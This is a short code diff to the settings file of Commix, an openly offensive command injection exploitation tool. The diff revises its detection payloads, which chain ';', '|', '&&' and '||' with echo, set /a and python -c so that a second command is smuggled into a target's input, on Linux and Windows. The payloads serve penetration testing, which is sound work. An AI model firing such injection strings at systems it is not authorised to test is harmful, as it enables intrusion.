@@ -234,7 +234,7 @@ DESCRIPTION_FULL = "Automated All-in-One OS Command Injection Exploitation Tool"
 DESCRIPTION = "The command injection exploiter"
 AUTHOR  = "Anastasios Stasinopoulos"
 VERSION_NUM = "3.5"
-REVISION = "76"
+REVISION = "77"
 STABLE_RELEASE = False
 if STABLE_RELEASE:
   VERSION = "v" + VERSION_NUM + "-stable"
@@ -273,12 +273,25 @@ INJECT_TAG = "INJECT_HERE"
 INJECT_TAG_REGEX = r"(?i)INJECT[_]?HERE"
 VALUE_BOUNDARIES = r'[\\/](.+?)[\\/]'
 
+# Default (windows) target host's python interpreter
+WIN_PYTHON_INTERPRETER = "python.exe"
+USER_DEFINED_PYTHON_DIR = False
+
+# Default (linux) target host's python interpreter
+LINUX_PYTHON_INTERPRETER = "python3"
+USER_DEFINED_PYTHON_INTERPRETER = False
+
 #Basic heuristic checks for command injections
 RAND_A = random.randint(1,10000)
 RAND_B = random.randint(1,10000)
-BASIC_STRING = str(RAND_A) + "+" + str(RAND_B)
-BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $((" + BASIC_STRING + "))&&echo $((" + BASIC_STRING + "))||echo $((" + BASIC_STRING + "))",
-                                   "|set /a (" + BASIC_STRING + ")&set /a (" + BASIC_STRING + ")"
+CALC_STRING = str(RAND_A) + "+" + str(RAND_B)
+BASIC_STRING = "(" + CALC_STRING + ")"
+BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + BASIC_STRING + ")&&echo $(" + BASIC_STRING + ")||echo $(" + BASIC_STRING + ")",
+                                   "|set /a " + BASIC_STRING + "&set /a " + BASIC_STRING
+                                   ]
+ALTER_SHELL_BASIC_STRING = " -c \"print(int(" + CALC_STRING + "))\""
+ALTER_SHELL_BASIC_COMMAND_INJECTION_PAYLOADS = [";echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")&&echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")||echo $(" + LINUX_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + ")",
+                                   "|for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p =%i< nul &for /f \"tokens=*\" %i in ('cmd /c " + WIN_PYTHON_INTERPRETER + ALTER_SHELL_BASIC_STRING + "') do @set /p =%i< nul"
                                    ]
 BASIC_COMMAND_INJECTION_RESULT = str(RAND_A + RAND_B)
 IDENTIFIED_COMMAND_INJECTION = False
@@ -876,14 +889,6 @@ TFB_DECIMAL = False
 
 # Ignore Error Message
 IGNORE_ERR_MSG = False
-
-# Default (windows) target host's python interpreter
-WIN_PYTHON_INTERPRETER = "python.exe"
-USER_DEFINED_PYTHON_DIR = False
-
-# Default (linux) target host's python interpreter
-LINUX_PYTHON_INTERPRETER = "python3"
-USER_DEFINED_PYTHON_INTERPRETER = False
 
 # Windows PHP installed directory.
 WIN_PHP_DIR = "C:\\xampp\\php\\php.exe"
